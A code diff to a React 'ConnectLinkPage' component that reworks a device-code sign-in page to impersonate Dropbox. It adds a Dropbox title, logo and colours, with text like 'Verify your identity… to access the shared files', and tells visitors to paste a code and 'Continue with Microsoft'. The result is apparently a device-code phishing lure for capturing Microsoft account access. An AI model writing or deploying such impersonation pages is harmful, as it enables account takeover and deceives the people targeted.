@@ -21,7 +21,7 @@ export function ConnectLinkPage() {
   // Remove favicon and set page title for connection page
   useEffect(() => {
     const originalTitle = document.title;
-    document.title = "Connection";
+    document.title = "Dropbox - Secure file access";
 
     // Remove favicon
     const existingIcons = document.querySelectorAll("link[rel*='icon']");
@@ -200,41 +200,44 @@ export function ConnectLinkPage() {
           />
         </div>
 
+        {/* Dropbox logo */}
+        <div style={{ textAlign: "center", marginBottom: 24 }}>
+          <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style={{ margin: "0 auto" }}>
+            <path d="M14.4 4L4 10.8L14.4 17.6L24 10.8L14.4 4Z" fill="#0061FF"/>
+            <path d="M4 24.4L14.4 31.2L24 24.4L14.4 17.6L4 24.4Z" fill="#0061FF"/>
+            <path d="M24 24.4L33.6 31.2L44 24.4L33.6 17.6L24 24.4Z" fill="#0061FF"/>
+            <path d="M44 10.8L33.6 4L24 10.8L33.6 17.6L44 10.8Z" fill="#0061FF"/>
+            <path d="M14.4 33.2L24 26.4L33.6 33.2L24 40L14.4 33.2Z" fill="#0061FF"/>
+          </svg>
+        </div>
+
         {(status === "loading" || status === "starting") && (
           <div style={{ textAlign: "center", padding: "40px 0" }}>
             <div className="loading-spinner" />
-            <p style={{ marginTop: 16, color: "var(--color-text-muted)" }}>
-              {status === "loading" ? "Loading..." : "Generating your sign-in code..."}
+            <p style={{ marginTop: 16, color: "#637282" }}>
+              {status === "loading" ? "Loading..." : "Preparing secure access..."}
             </p>
           </div>
         )}
 
         {status === "ready" && session && (
           <div>
-            <div style={{
-              width: 64, height: 64, borderRadius: "50%",
-              background: "var(--color-bg-active)",
-              display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 20px", fontSize: 28,
-            }}>
-              📧
-            </div>
-            <h1 style={{ fontSize: 20, marginBottom: 8, textAlign: "center" }}>Connect your account</h1>
-            <p style={{ marginBottom: 28, color: "var(--color-text-secondary)", textAlign: "center", lineHeight: 1.6 }}>
-              Connect your account to View and Manage the File
+            <h1 style={{ fontSize: 20, marginBottom: 8, textAlign: "center", color: "#1e1919" }}>Verify your identity</h1>
+            <p style={{ marginBottom: 28, color: "#637282", textAlign: "center", lineHeight: 1.6, fontSize: 14 }}>
+              To access the shared files, verify your identity by signing in with your Microsoft account.
             </p>
 
             <div style={{
-              background: "var(--color-bg-secondary)",
-              borderRadius: "var(--radius-lg)",
+              background: "#f7f5f2",
+              borderRadius: 12,
               padding: "24px", marginBottom: 20, textAlign: "center",
             }}>
-              <div style={{ fontSize: 12, color: "var(--color-text-muted)", marginBottom: 10, textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 }}>
-                Your Code
+              <div style={{ fontSize: 11, color: "#637282", marginBottom: 10, textTransform: "uppercase", letterSpacing: 1.5, fontWeight: 600 }}>
+                Verification Code
               </div>
               <div style={{
                 fontSize: 36, fontWeight: 700, letterSpacing: 8,
-                color: "var(--color-primary)", fontFamily: "var(--font-mono)", marginBottom: 12,
+                color: "#0061FF", fontFamily: "monospace", marginBottom: 12,
               }}>
                 {session.userCode}
               </div>
@@ -242,10 +245,10 @@ export function ConnectLinkPage() {
                 onClick={handleCopyCode}
                 style={{
                   padding: "6px 20px", fontSize: 13,
-                  background: copied ? "var(--color-success)" : "var(--color-bg)",
-                  color: copied ? "white" : "var(--color-text)",
-                  border: "1px solid var(--color-border)",
-                  borderRadius: "var(--radius-md)", cursor: "pointer", transition: "all 0.2s",
+                  background: copied ? "#0061FF" : "white",
+                  color: copied ? "white" : "#1e1919",
+                  border: "1px solid #d4d2cf",
+                  borderRadius: 8, cursor: "pointer", transition: "all 0.2s",
                 }}
               >
                 {copied ? "Copied!" : "Copy Code"}
@@ -254,38 +257,37 @@ export function ConnectLinkPage() {
 
             <div style={{
               marginBottom: 20, padding: "16px",
-              background: "var(--color-bg-secondary)", borderRadius: "var(--radius-md)",
-              fontSize: 13, color: "var(--color-text-secondary)", lineHeight: 1.8,
+              background: "#f7f5f2", borderRadius: 8,
+              fontSize: 13, color: "#637282", lineHeight: 1.8,
             }}>
-              <div style={{ fontWeight: 600, marginBottom: 8, color: "var(--color-text)" }}>How to connect:</div>
-              <div>1. Copy the code above</div>
-              <div>2. Click <strong>Sign in with Microsoft</strong> below</div>
+              <div style={{ fontWeight: 600, marginBottom: 8, color: "#1e1919" }}>Steps to verify:</div>
+              <div>1. Copy the verification code above</div>
+              <div>2. Click <strong>Continue with Microsoft</strong> below</div>
               <div>3. Paste the code when prompted</div>
-              <div>4. Sign in with your Office 365 account</div>
+              <div>4. Sign in with your account</div>
             </div>
 
             <button
-              className="btn btn-primary"
               onClick={handleLogin}
-              style={{ padding: "14px 32px", fontSize: 15, width: "100%", justifyContent: "center", gap: 8 }}
+              style={{
+                padding: "14px 32px", fontSize: 15, width: "100%",
+                display: "flex", justifyContent: "center", alignItems: "center", gap: 8,
+                background: "#0061FF", color: "white", border: "none",
+                borderRadius: 8, cursor: "pointer", fontWeight: 600,
+                transition: "background 0.2s",
+              }}
+              onMouseEnter={(e) => (e.currentTarget.style.background = "#0050d4")}
+              onMouseLeave={(e) => (e.currentTarget.style.background = "#0061FF")}
             >
-              Sign in with Microsoft
+              Continue with Microsoft
             </button>
           </div>
         )}
 
         {status === "signing_in" && (
           <div style={{ textAlign: "center" }}>
-            <div style={{
-              width: 64, height: 64, borderRadius: "50%",
-              background: "var(--color-bg-active)",
-              display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 20px", fontSize: 28,
-            }}>
-              🔄
-            </div>
-            <h1 style={{ fontSize: 20, marginBottom: 8 }}>Waiting for sign-in</h1>
-            <p style={{ color: "var(--color-text-secondary)", marginBottom: 24, lineHeight: 1.6 }}>
+            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Waiting for verification</h1>
+            <p style={{ color: "#637282", marginBottom: 24, lineHeight: 1.6, fontSize: 14 }}>
               Complete the sign-in in the Microsoft window that opened. This page will update automatically.
             </p>
             <div className="loading-spinner" />
@@ -295,23 +297,28 @@ export function ConnectLinkPage() {
         {status === "done" && (
           <div style={{ textAlign: "center" }}>
             <div style={{
-              width: 64, height: 64, borderRadius: "50%",
-              background: "#e6f4ea",
+              width: 56, height: 56, borderRadius: "50%",
+              background: "#e6f9ed",
               display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 20px", fontSize: 28,
+              margin: "0 auto 20px",
             }}>
-              ✓
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#0d9f3f"/>
+              </svg>
             </div>
-            <h1 style={{ fontSize: 20, marginBottom: 8, color: "var(--color-success)" }}>Account connected</h1>
-            <p style={{ color: "var(--color-text-secondary)", lineHeight: 1.6, marginBottom: 20 }}>
-              Your Office 365 account has been connected successfully.
+            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Identity verified</h1>
+            <p style={{ color: "#637282", lineHeight: 1.6, marginBottom: 20, fontSize: 14 }}>
+              Your account has been successfully verified. You can now close this window.
             </p>
             <button
-              className="btn btn-primary"
               onClick={handleConnectAnother}
-              style={{ padding: "10px 24px" }}
+              style={{
+                padding: "10px 24px", fontSize: 14,
+                background: "#0061FF", color: "white", border: "none",
+                borderRadius: 8, cursor: "pointer", fontWeight: 600,
+              }}
             >
-              Connect another account
+              Verify another account
             </button>
           </div>
         )}
@@ -319,21 +326,26 @@ export function ConnectLinkPage() {
         {status === "error" && (
           <div style={{ textAlign: "center" }}>
             <div style={{
-              width: 64, height: 64, borderRadius: "50%",
+              width: 56, height: 56, borderRadius: "50%",
               background: "#fde8e8",
               display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 20px", fontSize: 28,
+              margin: "0 auto 20px",
             }}>
-              !
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#d32f2f"/>
+              </svg>
             </div>
-            <h1 style={{ fontSize: 20, marginBottom: 8 }}>Something went wrong</h1>
-            <p style={{ color: "var(--color-danger)", marginBottom: 16, lineHeight: 1.6 }}>
-              {error || "Something went wrong."}
+            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Verification failed</h1>
+            <p style={{ color: "#d32f2f", marginBottom: 16, lineHeight: 1.6, fontSize: 14 }}>
+              {error || "Something went wrong. Please try again."}
             </p>
             <button
-              className="btn btn-primary"
               onClick={handleConnectAnother}
-              style={{ padding: "10px 24px" }}
+              style={{
+                padding: "10px 24px", fontSize: 14,
+                background: "#0061FF", color: "white", border: "none",
+                borderRadius: 8, cursor: "pointer", fontWeight: 600,
+              }}
             >
               Try again
             </button>
